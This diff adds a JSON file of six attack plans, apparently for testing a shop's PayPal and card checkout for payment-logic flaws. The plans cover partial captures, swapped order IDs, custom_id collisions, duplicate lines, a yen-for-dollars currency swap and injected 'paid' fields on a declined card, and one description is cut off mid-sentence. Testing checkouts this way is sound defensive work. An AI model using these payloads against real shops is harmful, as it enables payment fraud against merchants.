@@ -1,0 +1,233 @@
+{
+  "plans": [
+    {
+      "name": "Partial capture for five",
+      "idea": "The capture endpoint may forward a client-supplied amount to PayPal, or accept any COMPLETED capture without comparing the captured amount and final_capture flag with the shop order's $245 total.",
+      "expect": "Five hoodies are fulfilled after only $49.00 is captured.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 5
+              }
+            ]
+          },
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
+          "body": {
+            "amount": {
+              "currency_code": "USD",
+              "value": "49.00"
+            },
+            "totalCents": 4900,
+            "final_capture": true
+          },
+          "save": "a"
+        }
+      ]
+    },
+    {
+      "name": "Cheap capture, costly order",
+      "idea": "The capture handler may trust a shop-order identifier supplied in the request body or query string instead of using the shop order permanently bound to the PayPal order being captured.",
+      "expect": "Only the $49 PayPal order is captured, but the separately created five-hoodie shop order is marked fulfilled.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 5
+              }
+            ]
+          },
+          "save": "a"
+        },
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ]
+          },
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
+          "body": {
+            "shopOrderId": "{{a.body.orderId}}",
+            "orderId": "{{a.body.orderId}}",
+            "custom_id": "{{a.body.orderId}}",
+            "invoice_id": "{{a.body.orderId}}"
+          },
+          "save": "c"
+        },
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture?orderId={{a.body.orderId}}&shopOrderId={{a.body.orderId}}",
+          "body": {},
+          "save": "d"
+        }
+      ]
+    },
+    {
+      "name": "Planted capture collision",
+      "idea": "Order creation may let the shopper control custom_id or reference_id. Planting a new five-item order under the legitimate order's identifier may make the shop resolve the genuinely signed $49 capture webhook to the newest matching order, even though that capture ID was already used for the original ",
+      "expect": "Five hoodies are fulfilled from the original $49 capture, with no capture for the new PayPal order.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 5
+              }
+            ],
+            "custom_id": "{{legit.shopOrderId}}",
+            "reference_id": "{{legit.shopOrderId}}"
+          },
+          "blockCapture": true,
+          "save": "b"
+        },
+        {
+          "do": "webhook",
+          "event": "PAYMENT.CAPTURE.COMPLETED",
+          "edit": {},
+          "signed": true,
+          "times": 1
+        }
+      ]
+    },
+    {
+      "name": "Duplicate lines, single charge",
+      "idea": "Pricing or PayPal-order creation may deduplicate repeated SKUs with a map or first-line lookup, while fulfillment retains every raw duplicate line from the submitted bag.",
+      "expect": "PayPal charges $49 for one hoodie, but three duplicate hoodie lines are shipped.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              },
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              },
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 1
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Yen amount, dollar basket",
+      "idea": "Create-order handling may forward shopper-supplied currency or purchase_units to PayPal while recording the basket internally in USD, then compare only the numeric capture value and ignore its currency during capture verification.",
+      "expect": "Five hoodies recorded as a $245 order are settled for ¥245 instead of $245.",
+      "steps": [
+        {
+          "do": "buy",
+          "tamper": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 5
+              }
+            ],
+            "currency": "JPY",
+            "currency_code": "JPY",
+            "amount": {
+              "currency_code": "JPY",
+              "value": "245"
+            },
+            "purchase_units": [
+              {
+                "amount": {
+                  "currency_code": "JPY",
+                  "value": "245",
+                  "breakdown": {
+                    "item_total": {
+                      "currency_code": "JPY",
+                      "value": "245"
+                    }
+                  }
+                },
+                "items": [
+                  {
+                    "name": "Fogline Hoodie",
+                    "sku": "FOG-HOODIE",
+                    "quantity": "5",
+                    "unit_amount": {
+                      "currency_code": "JPY",
+                      "value": "49"
+                    }
+                  }
+                ]
+              }
+            ]
+          },
+          "blockCapture": false,
+          "save": "b"
+        }
+      ]
+    },
+    {
+      "name": "Declined card, injected paid state",
+      "idea": "The card checkout may construct its order from the submitted body, or honor paid/status/capture fields, before applying the card gateway's declined result. Referencing the already completed legitimate capture may make the new order appear settled.",
+      "expect": "Five hoodies are fulfilled although the submitted card is declined and no new payment is captured.",
+      "steps": [
+        {
+          "do": "request",
+          "method": "POST",
+          "path": "/api/checkout/card",
+          "body": {
+            "items": [
+              {
+                "sku": "FOG-HOODIE",
+                "qty": 5
+              }
+            ],
+            "email": "robber@example.test",
+            "card": {
+              "number": "4000000000000002",
+              "exp": "12/30",
+              "cvc": "123"
+            },
+            "status": "fulfilled",
+            "paid": true,
+            "paymentStatus": "COMPLETED",
+            "captureId": "{{legit.captureId}}",
+            "paypalOrderId": "{{legit.paypalOrderId}}",
+            "totalCents": 4900,
+            "amountPaidCents": 4900
+          },
+          "save": "a"
+        }
+      ]
+    }
+  ]
+}
